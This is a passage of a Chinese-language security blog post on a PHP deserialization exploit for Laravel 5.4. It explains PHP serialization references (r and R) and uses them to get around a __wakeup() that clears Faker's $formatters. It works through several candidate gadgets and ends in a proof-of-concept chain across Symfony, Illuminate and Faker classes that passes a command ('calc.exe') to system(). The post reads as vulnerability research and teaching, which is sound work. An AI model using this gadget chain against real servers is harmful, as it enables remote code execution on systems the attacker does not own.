class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>理论上来说，当执行了这个POC之后，就会执行ls命令。</p><h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p>不过这里会有一个问题，应该是Laravel官方在后续的更新里对这个版本进行了更新，然后通过一个<code>__wakeup()</code>将<code>$formatters</code>置空了。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114161405491.png" alt="image-20221114161405491"></p><p>也就是说这条链子这里是死了，不能继续调用。</p><h3 id="inHann师傅给出的解决思路："><a href="#inHann师傅给出的解决思路：" class="headerlink" title="inHann师傅给出的解决思路："></a>inHann师傅给出的解决思路：</h3><p>但是这里应该还是存在一些解决方案的，当我看见这个__wakeup()的时候，首先考虑到的就是能不能改变对象的数量，然后通过**CVE-2016-7124(__wakeup绕过)**，来进行绕过。</p><p>但是这里存在一个问题，对于Laravel 5.4.*，需要的PHP版本需要大于等于5.6.4</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114224508572.png" alt="image-20221114224508572"></p><p>而这个CVE的影响范围却是，PHP5&lt;5.6.25，PHP7&lt;7.0.10，因此这个不在CVE使用的范围内。</p><p>但是后来我在P神的知识星球里面看到了一篇文章，是inHann师傅给出的思路，这里我尝试用于解决一下5.4.*版本的Laravel的<code>__wakeup()</code>绕过问题。</p><blockquote><p>原文如下：</p><p><a href="https://inhann.top/2022/05/17/bypass_wakeup/">https://inhann.top/2022/05/17/bypass_wakeup/</a></p></blockquote><p>这里我还是写一下个人理解以及需要的前置知识。</p><p>参考了：</p><blockquote><p><a href="https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/">https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/</a></p><p><a href="https://www.neatstudio.com/show-161-1.shtml">https://www.neatstudio.com/show-161-1.shtml</a></p></blockquote><h4 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h4><p>PHP序列化与反序列化中的数据类型与引用方式（reference)</p><p>首先，我们知道在PHP中，使用<code>serialize()</code>函数对对象进行序列化的时候，会使用不同的字母将其中的变量的类型表示出来，例如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;String&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221118112733601.png" alt="image-20221118112733601"></p><p>其中<code>O</code>代表的对象，<code>s</code>代表字符串，<code>i</code>代表整形。</p><p>全部类型：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221118113030862.png" alt="image-20221118113030862"></p><p>比较常见的类型都是数组之类的，但是其中有两个比较特殊的变量类型，r，R。这两个表示的是引用。</p><p>其中r表示的是对象引用，个人理解也可以说是对于标识符的引用。</p><p>而R表示的是指针引用，也就是直接引用指向对应内存地址的指针。</p><p>或者说：</p><p><strong>当两个对象本来就是同一个对象时后出现的对象将会以小写r表示。</strong></p><p><strong>而当PHP中的一个对象如果是对另一对象显式的引用，那么在同时对它们进行序列化时将通过大写R表示</strong></p><p>两者之间的区别就是，R等于是两个不同的变量名指向了同一块内存（或者说两个不同的变量名里面存了两个不一样的标识符，但是两个标识符都是同时指向同一个内存），因此任何一个变量被改变了，都会影响到所有变量的值。</p><p>而r是相当于直接重新开辟了一个内存，只是将值复制过来，然后保存。</p><p>第一个是浅拷贝，也就是相当于是PHP序列化中的R。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119140559923.png" alt="image-20221119140559923"></p><p>（如果变量a将[1,2,3]进行了更改，那么b的值自然也会进行更改）</p><p>第二个是深拷贝，也就是对应的r。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119140642156.png" alt="image-20221119140642156"></p><p>（变量a,b相互不影响）</p><p>这里我用程序演示一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;first&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&#x27;second&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&#x27;third&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;c = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;c = <span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;c = &amp;<span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119144037594.png" alt="image-20221119144037594"></p><p>这里需要注意的是，<code>Demo</code>这个类，应当被编号为1，所以第二个输出的结果是<code>r:1</code>。然后<code>$a</code>被标志为2，依次类推。</p><p><code>r:1</code>表示的就是引用第一个值，也就是<code>Demo</code>。类似的，<code>r:2</code>就是<code>a</code>的值。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SampleClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SampleClass</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;r:1;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SampleClass</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;value = &amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;R:1;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;value = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见在运行了之后，$a只是改变了$value的值，而$b是直接将本身的值改变了。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119151638620.png" alt="image-20221119151638620"></p><p>这个就是两者之间的差别。</p><p>同时，这种方式有一个特点，即使你不是通过<code>serialize()</code>函数或是<code>Serializable</code>接口进行的正规序列化，而是直接手写一个<code>R:2</code>上去，也同样可以完成对于对象的引用。</p><h4 id="利用思想："><a href="#利用思想：" class="headerlink" title="利用思想："></a>利用思想：</h4><p>这里就出现了一个利用方式的思考，因为<code>R</code>方式的引用，可以使得两个不同的变量的值保持相同。</p><p>如果可以满足这个步骤：</p><ol><li>使得被置空的<code>$formatters</code>变量，与某个类中的变量<code>$bypass</code>成为<code>R</code>的指针引用关系。</li><li>当<code>$formatters</code>被置空的时候，通过改变<code>$bypass</code>的值，即可对<code>$formatters</code>的值进行修改</li><li>在执行<code>getFormatter()</code>之前完成上述操作，就可以成功对冲那个<code>__wakeup()</code>函数了。</li></ol><p>也就是说，最好能够找到一个赋值语句，且被赋值的语句是类中的成员属性。类似：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;a = xxx</span><br></pre></td></tr></table></figure><p>这样，就可以进行序列化，然后直接修改<code>$a</code>的引用方式，使得其引用<code>$formatters</code>，然后对其进行重新赋值，达成绕过。</p><p>这里想要达成在<code>__wakeup()</code>之后重新赋值的操作，正常的想法，就是通过反序列化后，触发某个类中的<code>__wakeup()</code>方法来进行赋值，或是在销毁类的时候，调用其中的<code>__destruct()</code>方法，来进行操作。</p><p>这里全局搜索一下<code>__wakeup()</code>方法：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120002101874.png" alt="image-20221120002101874"></p><h3 id="尝试1："><a href="#尝试1：" class="headerlink" title="尝试1："></a>尝试1：</h3><p>每一个都看了一下，感觉上<code>/vendor/laravel/framework/src/Illuminate/Queue/SerializesModels.php</code>比较有可能性：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120002304205.png" alt="image-20221120002304205"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ((<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>))-&gt;<span class="title function_ invoke__">getProperties</span>() <span class="keyword">as</span> <span class="variable">$property</span>) &#123;</span><br><span class="line">            <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getRestoredPropertyValue</span>(</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPropertyValue</span>(<span class="variable">$property</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里使用了一个foreach()函数进行了遍历，这里可以看到，使用了PHP中的反射类<code>ReflectionClass</code>，这个类的作用是通过类名来获取类的成员属性和方法信息。这里的参数是<code>$this</code>，也就是获取对象中的成员属性，然后会作为<code>ReflectionProperty</code>类的数组返回其中的成员。</p><p>通过foreach()函数，将值依次赋给<code>$property</code>。</p><p>然后调用了<code>setValue()</code>方法，这个是<code>ReflectionProperty</code>中自带的方法，用于对成员属性重新赋值，这里可以看到函数定义：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120163657770.png" alt="image-20221120163657770"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120163708953.png" alt="image-20221120163708953"></p><p>这里跟进一下<code>getRestoredPropertyValue()</code>方法，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120163758933.png" alt="image-20221120163758933"></p><p>第一个if会直接判断传入的参数是不是<code>ModelIdentifier</code>类中的成员属性，如果不是就会直接返回原值，到这里就够了，可以直接看下一步。</p><p>跟进一下<code>getPropertyValue()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120164013663.png" alt="image-20221120164013663"></p><p>这里可以看到，就是直接调用了<code>setAccessible()</code>函数，保证这里可以访问保护或者是私有的属性，然后返回值。</p><p>本来这里应该是一个可以利用的点，但是因为这个类中没有定义成员变量，无法利用<code>setValue()</code>这一段。算是失败了。</p><h3 id="尝试2："><a href="#尝试2：" class="headerlink" title="尝试2："></a>尝试2：</h3><p>因为上面看过了__wakeup()函数暂时是没有可以利用点，这里重新看一下<code>__destruct()</code></p><p>看看能不能找到什么可以利用的点。</p><p>这里找到了一个疑似可以利用的地方：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\vendor\sebastian\recursion-context\src\Context.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121084701765.png" alt="image-20221121084701765"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121084749431.png" alt="image-20221121084749431"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121084812105.png" alt="image-20221121084812105"></p><p>这里可以看到，作为私有属性定义的<code>$arrays</code>变量，只有通过<code>__construct()</code>方法进行赋值，或者是调用<code>addArray()</code>函数，进行属性的添加。因此我们可以对这个数组的内容进行操作。</p><p>但是，虽然可以对数组进行操作，但是我们不能对<code>$array</code>变量进行操作操作，因此不能使它对<code>$formatters</code>变量进行引用，也就不能利用了。</p><p>如果这里对<code>$array</code>进行了成员属性的定义，就是一个可以利用的点。</p><h3 id="尝试3："><a href="#尝试3：" class="headerlink" title="尝试3："></a>尝试3：</h3><p>这里还有一个疑似可以利用的地方：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\vendor\symfony\routing\Loader\Configurator\CollectionConfigurator.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121161246529.png" alt="image-20221121161246529"></p><p>这里可以看见成员属性<code>$this-&gt;collection</code>被新建为了<code>RouteCollection</code>类的对象，然后在<code>__destruct()</code>中，进行了方法调用。</p><p>这里跟进一下<code>addPrefix</code>方法，这里看名字应该是某个添加什么东西的方法。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addPrefix</span>(<span class="params"><span class="variable">$prefix</span>, <span class="keyword">array</span> <span class="variable">$defaults</span> = [], <span class="keyword">array</span> <span class="variable">$requirements</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$prefix</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$prefix</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> === <span class="variable">$prefix</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;routes <span class="keyword">as</span> <span class="variable">$route</span>) &#123;</span><br><span class="line">            <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">setPath</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$prefix</span>.<span class="variable">$route</span>-&gt;<span class="title function_ invoke__">getPath</span>());</span><br><span class="line">            <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">addDefaults</span>(<span class="variable">$defaults</span>);</span><br><span class="line">            <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">addRequirements</span>(<span class="variable">$requirements</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里对$prefix参数进行了处理，将字符串左右的空白制表等符号，还有<code>/</code>去除，如果去除完了之后是空，则直接返回。如果不是，则对<code>RouteCollection</code>中的成员属性进行foreach()遍历。</p><p>这里跟进一下<code>setPath()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121164327784.png" alt="image-20221121164327784"></p><p>这里可以看到<code>$this-&gt;path</code>，这里有一个外面的<code>/</code>，没办法去除，绕不过。不然可以尝试去修改<code>$formatters</code></p><p>接下来看看<code>addDefaults</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121170300789.png" alt="image-20221121170300789"></p><p>其中<code>$this-&gt;defaults</code>的值是我们可以控制的，如果对传入的参数我们可以完全控制的话，<code>$name</code>和<code>$default</code>也都是我们可以控制的内容，这里就算是打通了。</p><p>也就是通过数组的相互引用来修改<code>$formatters</code>的值，具体操作思路如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//思路：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$default</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$array</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">array</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;<span class="keyword">default</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">array</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;<span class="keyword">default</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;a:2:&#123;i:0;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;&#125;s:7:&quot;default&quot;;R:2;s:5:&quot;array&quot;;a:5:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//注意看default后面那个R:2，这里是引用了$a的值。</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121172642826.png" alt="image-20221121172642826"></p><p>输出结果如上，可以看到$a的值，从<code>[&quot;a&quot;,&quot;b&quot;]</code>，变成了<code>[1,2,3,4,5]</code>这里可以实现修改。同样的，对于<code>$formatters</code>也可以进行这样的操作。</p><p>回头看一下<code>$defaults</code>值的获取。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122152428364.png" alt="image-20221122152428364"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121173644281.png" alt="image-20221121173644281"></p><p>麻了，是不能传递参数的一个形参，这里用不了。</p><p>下面的<code>addRequirements()</code>函数也是同理，都是不能传递参数的一个形参，无法调用。</p><p>再回头看一下<code>addCollection()</code>这部分：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122160020766.png" alt="image-20221122160020766"></p><p>这部分可以看到调用了一个函数，直接跟进一下。这个是<code>RouteCollection</code>类中的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122160546267.png" alt="image-20221122160546267"></p><p>这里可以看到用的是传入的类中的参数，调用了其中的all()函数，这里跟进一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122162455672.png" alt="image-20221122162455672"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122162552999.png" alt="image-20221122162552999"></p><p>可以看到这里关于<code>$routes</code>变量的赋值，是我们可以操控的。</p><p>这里这个函数的foreach()部分，和之前分析的基本一样，因此这里应该是可以打通的。</p><h3 id="构造POC："><a href="#构造POC：" class="headerlink" title="构造POC："></a>构造POC：</h3><p>用之前的POC来进行修改：</p><p>这里注意要利用<code>__wakeup()</code>和<code>__destruct()</code>执行的顺序差。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CollectionConfigurator</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> <span class="title class_">function</span> <span class="title class_">__construct</span>()&#123;</span><br><span class="line">            $<span class="title class_">this</span>-&gt;<span class="title class_">parent</span> = <span class="title class_">new</span> \<span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">RouteCollection</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;collection = <span class="keyword">new</span> <span class="title class_">\Symfony\Component\Routing\RouteCollection</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;route = <span class="keyword">new</span> <span class="title class_">\Symfony\Component\Routing\Route</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parentConfigurator = <span class="keyword">new</span> <span class="title class_">\Illuminate\Broadcasting\PendingBroadcast</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Traversable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RouteCollection</span> <span class="keyword">implements</span> \<span class="title">IteratorAggregate</span>, \<span class="title">Countable</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;routes = <span class="keyword">array</span>(<span class="string">&quot;dispatch&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement getIterator() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement count() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">implements</span> \<span class="title">Serializable</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path = <span class="string">&#x27;////&#x27;</span>;  <span class="comment">//这里被trim了之后会直接为空，进入return，主要是为了方便</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>([</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;path,</span><br><span class="line">                <span class="string">&#x27;host&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;host,</span><br><span class="line">                <span class="string">&#x27;defaults&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;defaults,</span><br><span class="line">                <span class="string">&#x27;requirements&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;requirements,</span><br><span class="line">                <span class="string">&#x27;options&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;options,</span><br><span class="line">                <span class="string">&#x27;schemes&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;schemes,</span><br><span class="line">                <span class="string">&#x27;methods&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;methods,</span><br><span class="line">                <span class="string">&#x27;condition&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;condition,</span><br><span class="line">                <span class="string">&#x27;compiled&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;compiled,</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement unserialize() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span>  <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">\Faker\Generator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="string">&#x27;calc.exe&#x27;</span>; <span class="comment">//执行的命令在这里，修改了就可以</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$providers</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = [<span class="string">&#x27;useless&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">POC</span> = <span class="title class_">new</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span>\<span class="title class_">CollectionConfigurator</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">str_replace</span>(<span 